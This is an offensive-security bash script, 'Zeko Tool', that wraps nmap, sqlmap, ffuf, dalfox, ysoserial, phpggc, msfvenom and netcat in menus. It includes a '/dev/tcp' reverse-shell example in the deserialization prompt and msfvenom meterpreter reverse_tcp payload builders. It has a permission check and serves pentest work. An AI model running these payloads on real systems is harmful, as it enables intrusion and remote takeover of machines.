#!/usr/bin/env bash

set -euo pipefail
IFS=$'\n\t'

RED="\e[31m"; GREEN="\e[32m"; YELLOW="\e[33m"; BLUE="\e[34m"; MAG="\e[35m"; CYAN="\e[36m"; RESET="\e[0m"
RESULTS_ROOT="./results"
TARGET_IP=""
LISTENER_IP=""
INTERFACE=""
SUBNET=""
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"

TOOLS=(nmap masscan netdiscover gobuster nikto dirb wfuzz ffuf sqlmap hydra enum4linux sslscan msfvenom msfconsole nc dalfox ysoserial phpggc)

show_banner(){
    clear
    echo -e "${CYAN}"
    echo "███████╗███████╗██╗  ██╗ ██████╗      ████████╗ ██████╗  ██████╗ ██╗     "
    echo "██╔════╝██╔════╝██║  ██║ ██╔═══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     "
    echo "███████╗███████╗███████║ ██║   ██║       ██║   ██║   ██║██║   ██║██║     "
    echo "╚════██║╚════██║██╔══██║ ██║   ██║       ██║   ██║   ██║██║   ██║██║     "
    echo "███████║███████║██║  ██║ ██████╔╝        ██║   ╚██████╔╝╚██████╔╝███████╗"
    echo "╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝         ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝"
    echo -e "${RESET}"
    echo -e "${RED}================================================================${RESET}"
    echo -e "${RED}                        Z E K O   T O O L                       ${RESET}"
    echo -e "${RED}================================================================${RESET}"
    echo -e "${MAG}                 Developed by Mohamed Zakaria${RESET}"
    echo -e "${YELLOW}          Offensive Security | Automation | Pentesting Suite${RESET}"
    echo -e "${BLUE}             GitHub: https://github.com/MohamedZakria246${RESET}"
    echo ""
}

pause(){ read -rp "Press Enter to continue..."; }


detect_interface_and_ip(){
    if command -v ip >/dev/null 2>&1; then
        local iface ipaddr cidr
        iface=$(ip -o -4 addr show up primary scope global | awk '{print $2; exit}' || true)
        cidr=$(ip -o -4 addr show up primary scope global | awk '{print $4; exit}' || true)
        ipaddr=${cidr%%/*}
        if [[ -n "$iface" && -n "$ipaddr" ]]; then
            INTERFACE="$iface"
            LISTENER_IP="$ipaddr"
            SUBNET="$cidr"
        fi
    fi

    INTERFACE=${INTERFACE:-eth0}
    LISTENER_IP=${LISTENER_IP:-127.0.0.1}
    SUBNET=${SUBNET:-"${LISTENER_IP%.*}.0/24"}
}

prepare_result_dir(){
    local tgt="$1"
    local dir="$RESULTS_ROOT/$tgt/$TIMESTAMP"
    mkdir -p "$dir"
    echo "$dir"
}

get_package_manager(){
    if command -v apt >/dev/null 2>&1; then
        echo "apt"
    elif command -v dnf >/dev/null 2>&1; then
        echo "dnf"
    elif command -v yum >/dev/null 2>&1; then
        echo "yum"
    else
        echo "unknown"
    fi
}

install_tool(){
    local tool="$1"
    local pkg_manager=$(get_package_manager)
    local pkg="$tool"
    local update_cmd=""
    local install_cmd=""

    case "$tool" in
        msfconsole|msfvenom)
            pkg="metasploit-framework"
            ;;
        nc)
            pkg=$([ "$pkg_manager" = "apt" ] && echo "netcat-openbsd" || echo "netcat")
            ;;
        dalfox)
            pkg="dalfox"
            ;;
        ysoserial)
            pkg="java-1.8.0-openjdk"
            if [ "$pkg_manager" = "apt" ]; then
                pkg="default-jre"
            fi
            echo -e "${YELLOW}Note: ysoserial itself must usually be downloaded as a JAR file after installing Java.${RESET}"
            ;;
        phpggc)
            pkg="php-cli"
            ;;
        *)
            pkg="$tool"
            ;;
    esac

    case "$pkg_manager" in
        apt)
            update_cmd="sudo apt update"
            install_cmd="sudo apt install -y $pkg"
            ;;
        dnf)
            update_cmd="sudo dnf check-update"
            install_cmd="sudo dnf install -y $pkg"
            ;;
        yum)
            update_cmd="sudo yum check-update"
            install_cmd="sudo yum install -y $pkg"
            ;;
        unknown)
            echo -e "${RED}Error: Cannot find apt, dnf, or yum. Please install '$tool' manually.${RESET}"
            return 1
            ;;
    esac

    echo -e "${BLUE}Attempting to install package dependencies for: $tool using $pkg_manager${RESET}"
    read -rp "Continue? (y/N): " ok
    if [[ "$ok" =~ ^[Yy]$ ]]; then
        if [[ "$pkg_manager" != "unknown" ]]; then
            eval "$update_cmd" 2>/dev/null || true

            if eval "$install_cmd"; then
                echo -e "${GREEN}Successfully installed package dependency $pkg.${RESET}"
            else
                echo -e "${RED}Installation of $pkg failed. Please check installation instructions for '$tool' manually.${RESET}"
                return 1
            fi
        fi
    else
        echo "Aborted installation of $pkg."
        return 1
    fi
}

check_tools(){
    echo -e "${BLUE}Checking availability of penetration testing tools...${RESET}"
    missing=()
    available=()
    for t in "${TOOLS[@]}"; do
        if command -v "$t" >/dev/null 2>&1; then
            available+=("$t")
        else
            missing+=("$t")
        fi
    done

    echo -e "${GREEN}Available:${RESET} ${available[*]:-None}"
    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${YELLOW}Missing (optional):${RESET} ${missing[*]}"
        read -rp "Do you want to attempt to install missing tools dependencies now? (y/N): " ans
        if [[ "$ans" =~ ^[Yy]$ ]]; then
            for tool in "${missing[@]}"; do
                install_tool "$tool" || pause
            done
        fi
    fi
    pause
}

set_target_manual(){
    read -rp "Enter target IP or hostname (or press Enter to cancel): " tin
    if [[ -n "$tin" ]]; then
        TARGET_IP="$tin"
        echo -e "${GREEN}Target set to: $TARGET_IP${RESET}"
    else
        echo "No change."
    fi
    pause
}

confirm_and_run(){
    local cmd="$1"
    local outfile_base="${2:-}"
    local outdir=""
    local first_token

    echo
    echo -e "${MAG}Command:${RESET}"
    echo -e "${BLUE}$cmd${RESET}"
    echo

    first_token=$(echo "$cmd" | sed -E 's/^\s*sudo\s+//; s/\s.*$//')

    if [[ "$first_token" != "java" ]] && ! command -v "$first_token" >/dev/null 2>&1; then
        echo -e "${YELLOW}Tool '$first_token' is not installed.${RESET}"
        read -rp "Do you want to attempt to install dependencies for '$first_token' now? (y/N): " install_ans
        if [[ "$install_ans" =~ ^[Yy]$ ]]; then
            if install_tool "$first_token"; then
                if ! command -v "$first_token" >/dev/null 2>&1 && [[ "$first_token" != "dalfox" && "$first_token" != "phpggc" ]]; then
                    echo -e "${RED}Installation of dependency succeeded, but the tool may require manual setup (like go install or JAR download).${RESET}"
                    pause
                else
                    echo -e "${GREEN}Installed dependencies. Proceeding...${RESET}"
                fi
            else
                echo -e "${RED}Installation failed. Cannot run command.${RESET}"
                pause
                return
            fi
        else
            echo -e "${YELLOW}Skipping command because required tool is missing.${RESET}"
            pause
            return
        fi
    fi

    echo "Choose execution mode:"
    echo "  1) Show output only (no save)"
    echo "  2) Save output to file and show on terminal"
    echo "  3) Save output to file (do not tee to terminal)"
    echo "  4) Skip / Cancel"
    read -rp "Mode [1]: " mode
    mode=${mode:-1}

    case "$mode" in
        1)
            echo -e "${YELLOW}Running (show-only). Output will NOT be saved.${RESET}"
            eval "$cmd"
            ;;
        2)
            tgtname=${TARGET_IP:-unspecified}
            outdir=$(prepare_result_dir "$tgtname")
            outfile="$outdir/${outfile_base:-command_$(date +%s)}.txt"
            echo -e "${GREEN}Saving to: $outfile${RESET}"
            eval "$cmd" 2>&1 | tee "$outfile"
            ;;
        3)
            tgtname=${TARGET_IP:-unspecified}
            outdir=$(prepare_result_dir "$tgtname")
            outfile="$outdir/${outfile_base:-command_$(date +%s)}.txt"
            echo -e "${GREEN}Saving to: $outfile (silent)${RESET}"
            eval "$cmd" > "$outfile" 2>&1
            echo -e "${GREEN}Saved.${RESET}"
            ;;
        4)
            echo "Skipped execution."
            ;;
        *)
            echo "Invalid selection. Skipping."
            ;;
    esac
    pause
}

configure_network(){
    show_banner
    echo -e "${BLUE}Network Configuration${RESET}"
    detect_interface_and_ip
    echo -e "${GREEN}Auto-detected interface:${RESET} $INTERFACE"
    echo -e "${GREEN}Auto-detected listener IP:${RESET} $LISTENER_IP"
    echo -e "${GREEN}Auto-detected subnet:${RESET} $SUBNET"
    echo ""
    read -rp "Change interface (or press Enter to keep $INTERFACE): " iin
    INTERFACE=${iin:-$INTERFACE}
    read -rp "Change listener IP (or Enter to keep $LISTENER_IP): " lip
    LISTENER_IP=${lip:-$LISTENER_IP}
    read -rp "Change subnet (or Enter to keep $SUBNET): " ssub
    SUBNET=${ssub:-$SUBNET}
    echo -e "${GREEN}Configured: Interface=$INTERFACE Listener=$LISTENER_IP Subnet=$SUBNET${RESET}"
    pause
}

discover_targets(){
    show_banner
    echo -e "${BLUE}TARGET DISCOVERY${RESET}"
    echo "Subnet: $SUBNET"
    echo
    if command -v netdiscover >/dev/null 2>&1; then
        echo -e "${GREEN}Running netdiscover (ARP sweep) on $SUBNET...${RESET}"
        confirm_and_run "sudo netdiscover -r $SUBNET -P" "netdiscover"
    else
        echo -e "${YELLOW}netdiscover not installed. Using nmap -sn instead.${RESET}"
        confirm_and_run "nmap -sn $SUBNET" "nmap_ping"
    fi

    read -rp "Enter target IP to set (or press Enter to keep current: ${TARGET_IP:-unset}): " tin
    if [[ -n "$tin" ]]; then
        TARGET_IP="$tin"
        echo -e "${GREEN}Target set to: $TARGET_IP${RESET}"
    fi
    pause
}

port_scanning_menu(){
    while true; do
        show_banner
        echo -e "${BLUE}PORT SCANNING${RESET}"
        echo "Target: ${TARGET_IP:-NOT SET}"
        echo
        echo "1) Quick Nmap (top ports)"
        echo "2) SYN scan (1-1024)"
        echo "3) All ports fast (-p- -T4)"
        echo "4) UDP quick"
        echo "5) Service/version (-sV) + scripts"
        echo "6) Aggressive (-A)"
        echo "7) Masscan fast discovery"
        echo "9) Back"
        read -rp "Choose: " p
        case "$p" in
            1)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "nmap -sC -sV --top-ports 100 $TARGET_IP" "nmap_quick"
                ;;
            2)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "nmap -sS -Pn -p 1-1024 $TARGET_IP" "nmap_syn"
                ;;
            3)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "nmap -p- -T4 $TARGET_IP" "nmap_allports"
                ;;
            4)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "sudo nmap -sU --top-ports 50 $TARGET_IP" "nmap_udp"
                ;;
            5)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "nmap -sV -sC $TARGET_IP" "nmap_version"
                ;;
            6)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "nmap -A -Pn $TARGET_IP" "nmap_aggressive"
                ;;
            7)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                echo -e "${YELLOW}Masscan requires tuning --rate. Use carefully.${RESET}"
                confirm_and_run "sudo masscan -p1-65535 --rate 1000 $TARGET_IP" "masscan"
                ;;
            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

web_menu(){
    while true; do
        show_banner
        echo -e "${BLUE}WEB TESTING${RESET}"
        echo "Target: ${TARGET_IP:-NOT SET}"
        echo
        echo "1) Gobuster dir (common)"
        echo "2) Nikto web scan"
        echo "3) WhatWeb"
        echo "4) SQLMap quick (requires full URL)"
        echo "5) Set target manually"
        echo "9) Back"
        read -rp "Choose: " w
        case "$w" in
            1)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -t 30" "gobuster"
                ;;
            2)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "nikto -h http://$TARGET_IP" "nikto"
                ;;
            3)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "whatweb -v http://$TARGET_IP" "whatweb"
                ;;
            4)
                read -rp "Enter full URL (e.g. http://$TARGET_IP/page.php?id=1): " url
                [[ -z "$url" ]] && { echo -e "${RED}URL required.${RESET}"; pause; continue; }
                confirm_and_run "sqlmap -u '$url' --batch" "sqlmap"
                ;;
            5)
                set_target_manual
                ;;
            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

fuzzing_menu(){
    while true; do
        show_banner
        echo -e "${BLUE}FUZZING${RESET}"
        echo "Target: ${TARGET_IP:-NOT SET}"
        echo
        echo "1) FFUF directory fuzzing"
        echo "2) FFUF parameter fuzzing"
        echo "9) Back"
        read -rp "Choose: " f
        case "$f" in
            1)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set target first.${RESET}"; pause; continue; }
                confirm_and_run "ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50" "ffuf_dir"
                ;;
            2)
                read -rp "Enter parameterized path (e.g. /page.php?id=FUZZ): " ppath
                [[ -z "$ppath" ]] && { echo -e "${RED}Parameter path required.${RESET}"; pause; continue; }
                confirm_and_run "ffuf -u http://$TARGET_IP$ppath -w /usr/share/wordlists/dirb/common.txt -t 40" "ffuf_param"
                ;;
            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

xss_testing_menu(){
    local url_file
    while true; do
        show_banner
        echo -e "${BLUE}XSS REFLECTION AUTOMATION (DALFOX)${RESET}"
        echo "This uses Dalfox to test parameters in a list of URLs for XSS reflection."
        echo
        echo "1) Run Dalfox using a URL list file"
        echo "9) Back"
        read -rp "Choose: " xss_opt
        
        case "$xss_opt" in
            1)
                read -rp "Enter path to URL list file (e.g., urls.txt): " url_file
                
                if [[ ! -f "$url_file" ]]; then
                    echo -e "${RED}Error: File not found at '$url_file'.${RESET}"
                    pause
                    continue
                fi

                echo -e "${GREEN}Running Dalfox against URLs in $url_file...${RESET}"
                
                confirm_and_run "dalfox file '$url_file' --skip-bav --output-module=json" "dalfox_xss"
                ;;
            9)
                break
                ;;
            *)
                echo "Invalid option."
                sleep 1
                ;;
        esac
    done
}

serialization_menu(){
    local cmd_to_execute
    while true; do
        show_banner
        echo -e "${BLUE}SERIALIZATION / DESERIALIZATION ATTACKS${RESET}"
        echo "Listener IP: ${LISTENER_IP:-NOT SET}"
        echo
        echo "1) Java Deserialization Payload (ysoserial)"
        echo "2) PHP Deserialization Payload (phpggc)"
        echo "9) Back"
        read -rp "Choose: " s
        case "$s" in
            1) # ysoserial - Java
                local ysoserial_path selected_gadgets=()

                if command -v ysoserial.jar >/dev/null 2>&1; then
                    ysoserial_path="ysoserial.jar"
                elif [[ -f "ysoserial.jar" ]]; then
                    ysoserial_path="./ysoserial.jar"
                else
                    echo -e "${RED}Error: ysoserial.jar not found. Please ensure it is in the current directory or PATH.${RESET}"
                    pause
                    continue
                fi

                show_banner
                echo -e "${BLUE}JAVA DESERIALIZATION (YSOSERIAL) - GADGET SELECTION${RESET}"
                echo "1) Specify a single gadget manually"
                echo "2) List all available gadgets from ysoserial.jar"
                read -rp "Choose [1]: " java_opt
                java_opt=${java_opt:-1}

                if [[ "$java_opt" == "2" ]]; then
                    echo -e "${YELLOW}Attempting to retrieve gadget list (running java -jar $ysoserial_path)...${RESET}"
                    local gadget_list
                    # Execute ysoserial and filter the output to get the list of gadgets
                    gadget_list=$(java -jar "$ysoserial_path" 2>&1 | grep -E '^\s*(.+)\s*$' | awk '!seen[$0]++' | sed -E '/^\s*$/d' | grep -vE 'YsoSerial|Usage|Available')

                    if [[ -z "$gadget_list" ]]; then
                        echo -e "${RED}Failed to list gadgets. Check java/ysoserial installation/permissions.${RESET}"
                        pause
                        continue
                    fi

                    echo -e "${GREEN}--- Available Gadgets ---${RESET}"
                    echo "$gadget_list"
                    echo -e "${GREEN}-------------------------${RESET}"

                    read -rp "Enter gadgets to try (comma-separated, e.g., CC4,CC6) or type 'ALL' to test them all: " g_input

                    if [[ "$g_input" =~ ^[Aa][Ll][Ll]$ ]]; then
                        selected_gadgets=($(echo "$gadget_list"))
                    else
                        IFS=',' read -r -a selected_gadgets <<< "$g_input"
                    fi

                else
                    read -rp "Enter ysoserial gadget (e.g., CommonsCollections4): " gadget
                    if [[ -n "$gadget" ]]; then
                        selected_gadgets+=("$gadget")
                    fi
                fi

                if [[ ${#selected_gadgets[@]} -eq 0 ]]; then
                    echo -e "${RED}No gadgets selected.${RESET}"
                    pause
                    continue
                fi

                read -rp "Enter payload command (e.g., 'bash -i >& /dev/tcp/$LISTENER_IP/4444 0>&1'): " payload_cmd

                if [[ -z "$payload_cmd" ]]; then
                    echo -e "${RED}Payload command is required.${RESET}"
                    pause
                    continue
                fi

                for gadget in "${selected_gadgets[@]}"; do
                    gadget=$(echo "$gadget" | xargs)
                    if [[ -z "$gadget" ]]; then continue; fi

                    cmd_to_execute="java -jar $ysoserial_path $gadget '$payload_cmd'"
                    echo -e "${YELLOW}--- Running Gadget: $gadget ---${RESET}"
                    confirm_and_run "$cmd_to_execute" "ysoserial_java_${gadget}"
                done
                ;;

            2) # phpggc - PHP
                read -rp "Enter phpggc gadget (e.g., Laravel/RCE1): " gadget
                read -rp "Enter payload command (e.g., 'system(\"whoami\")'): " payload_cmd

                if [[ -z "$gadget" || -z "$payload_cmd" ]]; then
                    echo -e "${RED}Gadget and command are required.${RESET}"
                    pause
                    continue
                fi

                cmd_to_execute="phpggc $gadget '$payload_cmd' -s"
                echo -e "${YELLOW}Note: '-s' option prints the raw serialized string.${RESET}"
                confirm_and_run "$cmd_to_execute" "phpggc_php_${gadget}"
                ;;

            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

payload_menu(){
    while true; do
        show_banner
        echo -e "${BLUE}PAYLOAD GENERATION${RESET}"
        echo "Listener IP: ${LISTENER_IP:-NOT SET}"
        echo "1) Windows Meterpreter (exe)"
        echo "2) Linux Meterpreter (elf)"
        echo "3) PHP meterpreter (raw)"
        echo "9) Back"
        read -rp "Choose: " p
        case "$p" in
            1)
                read -rp "Enter LPORT (default 4444): " lport
                lport=${lport:-4444}
                confirm_and_run "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LISTENER_IP LPORT=$lport -f exe -o windows_rev_${lport}.exe" "msf_win"
                ;;
            2)
                read -rp "Enter LPORT (default 4444): " lport
                lport=${lport:-4444}
                confirm_and_run "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LISTENER_IP LPORT=$lport -f elf -o linux_rev_${lport}.elf" "msf_lin"
                ;;
            3)
                read -rp "Enter LPORT (default 4444): " lport
                lport=${lport:-4444}
                confirm_and_run "msfvenom -p php/meterpreter_reverse_tcp LHOST=$LISTENER_IP LPORT=$lport -f raw -o php_rev_${lport}.php" "msf_php"
                ;;
            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

exploitation_menu(){
    while true; do
        show_banner
        echo -e "${BLUE}EXPLOITATION / LISTENERS${RESET}"
        echo "Listener IP: ${LISTENER_IP:-NOT SET}"
        echo "1) Start msfconsole (interactive)"
        echo "2) Netcat listener (4444)"
        echo "9) Back"
        read -rp "Choose: " e
        case "$e" in
            1)
                echo -e "${YELLOW}Launching msfconsole...${RESET}"
                confirm_and_run "msfconsole" "msfconsole"
                ;;
            2)
                confirm_and_run "nc -nlvp 4444 -s $LISTENER_IP" "nc_listener"
                ;;
            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

main_menu(){
    PS3=$'\nChoose an option (type number): '
    options=(
        "Configure Network"
        "Set Target Manually"
        "Discover Targets"
        "Port Scanning"
        "Web Testing"
        "Fuzzing"
        "XSS Reflection Test (Dalfox)"
        "Serialization/Deserialization"
        "Payload Generation"
        "Exploitation / Listeners"
        "Check tools availability"
        "Exit"
    )

    while true; do
        show_banner
        echo -e "${GREEN}MAIN MENU${RESET}"
        echo "Target: ${TARGET_IP:-NOT SET} | Listener: ${LISTENER_IP:-NOT SET} | Interface: ${INTERFACE:-NOT SET}"
        echo
        select opt in "${options[@]}"; do
            case "$REPLY" in
                1) configure_network; break ;;
                2) set_target_manual; break ;;
                3) discover_targets; break ;;
                4) port_scanning_menu; break ;;
                5) web_menu; break ;;
                6) fuzzing_menu; break ;;
                7) xss_testing_menu; break ;;
                8) serialization_menu; break ;;
                9) payload_menu; break ;;
                10) exploitation_menu; break ;;
                11) check_tools; break ;;
                12) echo "Bye."; exit 0 ;;
                *) echo "Invalid selection. Please choose a number from the menu."; break ;;
            esac
        done
    done
}

trap 'echo; echo "Interrupted."; exit 1' INT TERM
show_banner

read -rp "Do you have explicit permission to test targets? (yes/no): " perm
if [[ ! "$perm" =~ ^(yes|y|Y)$ ]]; then
    echo -e "${RED}Permission required. Exiting.${RESET}"
    exit 1
fi

detect_interface_and_ip
main_menu
